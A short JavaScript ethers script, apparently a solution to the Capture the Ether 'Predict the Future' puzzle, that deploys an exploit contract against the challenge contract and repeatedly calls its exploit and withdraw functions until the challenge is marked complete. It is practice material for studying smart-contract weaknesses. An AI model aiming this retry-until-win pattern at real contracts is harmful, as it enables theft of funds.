async function main() {
    Challenge = await ethers.getContractFactory('PredictTheFutureChallenge');
    challenge = await Challenge.attach('0x2a378De3fB84AE78C1ee235C17842f9d1761508C');

    Exploit = await ethers.getContractFactory('PredictTheFutureExploit');
    exploit = await Exploit.deploy(challenge.address, {value: ethers.utils.parseEther('1')});
    await exploit.deployed();

    while (!await challenge.isComplete()) {
        try {
            tx = await exploit.exploit();
            await tx.wait();
            tx = await exploit.withdraw();
            await tx.wait();
        } catch (error) {
            console.error(error.message);
        }
    }
    console.log('Challenge completed:', await challenge.isComplete());
    console.log(await ethers.provider.getBalance(exploit.address));
    process.exit(0);
}

main()